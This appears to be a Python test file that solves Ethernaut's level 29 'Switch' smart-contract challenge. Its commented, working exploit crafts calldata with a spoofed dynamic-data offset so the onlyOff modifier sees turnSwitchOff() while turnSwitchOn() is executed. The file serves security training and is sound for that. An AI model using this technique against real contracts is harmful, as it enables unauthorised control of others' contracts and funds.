from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv29_switch import Switch


@default_chain.connect()
def test_lv29():
    ethernaut = EthernautDeployer(default_chain)
    contract = ethernaut.deploy_lv29()
    exploit_lv29(contract)
    ethernaut.check_lv29(contract)

def exploit_lv29(contract: Switch):
    # Attack vector: data offset can be specified freerly - multiple function selectors can be passed
    # Training: know how calldata for dynamic sized arguments are encoded

    # When passing dynamic types to calldata, we have to pass:
    #  1) the memory location (offset) of the data
    #  2) the length of the data
    #  3) the data itself

    # We will utilise this to modify the calldata structure in the following way:
    #  1) first we add the function selector of function we are calling
    #  2) then the memory location (offset) of the data
    #  3) then the turnSwitchOff() selector to bypass the onlyOff modifier
    #  4) the length of the data
    #  5) data itself - the function selector of function, which will be called - turnSwitchOn() 

    # The calldata will have the following layout:
    # ┌─────────────┬──────┬────────────────────────────────────────────────────────────┬────────────────────────────────┐
    # │ Bytes index │ Size │ Description                                                │ Short desctiption              │
    # ├─────────────┼──────┼────────────────────────────────────────────────────────────┼────────────────────────────────┤
    # │   0-3       │  4B  │ flipSwitch() selector - function we are calling first      │ = function which gets the data │
    # │   4-35      │ 32B  │ memory offset of the dynamic input - 60 (hex) = 96 (int)   │ = offset       \               │
    # │   36-67     │ 32B  │ empty zeros (so that the selector starts at the 68th byte) │ (skipped)       > 96 bytes     │
    # │   68-99     │ 32B  │ turnSwitchOff() selector to bypass the onlyOff modifier    │ (skipped)      /               │ 
    # │   100-131   │ 32B  │ input data length = 4 (bytes)                              │ = length                       │
    # │   132-163   │ 32B  │ turnSwitchOn() selector - function which gets called       │ = data                         │
    # └─────────────┴──────┴────────────────────────────────────────────────────────────┴────────────────────────────────┘

    calldata = Switch.flipSwitch.selector.hex() +\
        "0"*62 + "60" +\
        "0"*64 +\
        Switch.turnSwitchOff.selector.hex() + "0"*56 +\
        "0"*63 + "4" +\
        Switch.turnSwitchOn.selector.hex() + "0"*56

    contract.transact(bytes.fromhex(calldata))
